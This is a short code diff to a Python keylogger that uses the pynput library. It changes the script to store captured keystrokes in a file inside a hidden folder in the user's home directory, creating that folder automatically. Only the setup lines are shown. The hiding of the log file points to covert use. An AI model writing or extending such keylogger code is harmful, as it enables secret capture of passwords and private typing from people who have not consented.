@@ -1,7 +1,11 @@
 import logging
+import os
 from pynput import keyboard
 
-log_file_path = '/Users/mannatvirk/.hiddenfolder/keylog.txt'
+log_dir = os.path.join(os.path.expanduser("~"), ".hiddenfolder")
+os.makedirs(log_dir, exist_ok=True)
+
+log_file_path = os.path.join(log_dir, "keylog.txt")
 keystroke_logger = logging.getLogger('keystroke_logger')
 keystroke_logger.setLevel(logging.INFO)
 
